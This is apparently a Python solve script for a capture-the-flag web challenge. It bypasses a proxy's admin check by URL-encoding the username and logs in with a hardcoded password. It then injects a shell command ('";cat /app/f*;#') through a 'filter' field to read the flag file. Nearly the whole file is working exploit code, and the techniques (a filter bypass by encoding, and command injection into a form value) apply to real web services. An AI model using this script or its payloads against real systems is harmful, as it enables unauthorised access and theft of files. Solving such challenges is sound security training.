import re
import ssl
import urllib.request


BASE = "https://proxied.ctf.ritsec.club"
CT = "application/x-www-form-urlencoded"


def send_get_with_body(path: str, body: str) -> str:
    req = urllib.request.Request(
        BASE + path,
        data=body.encode(),
        headers={"Content-Type": CT},
        method="GET",
    )
    ctx = ssl.create_default_context()
    with urllib.request.urlopen(req, context=ctx) as resp:
        return resp.read().decode("utf-8", errors="replace")


def login_admin() -> str:
    # The proxy compares raw body strings and misses the URL-decoded username.
    body = "username=%61dmin&password=t0p5ecr3tp@ss"
    return send_get_with_body("/login", body).strip()


def read_flag(token: str) -> str:
    # filter = '";cat /app/f*;#'
    injected = "%22%3Bcat%20/app/f*%3B%23"
    body = f"username=%61dmin&token={token}&filter={injected}"
    return send_get_with_body("/admin/readlog", body)


def main():
    token = login_admin()
    print(f"[+] admin token: {token}")

    data = read_flag(token)
    print(data)

    match = re.search(r"RS\{[^}\n]+\}", data)
    if match:
        print(f"[+] flag: {match.group(0)}")
    else:
        print("[-] flag not found")


if __name__ == "__main__":
    main()
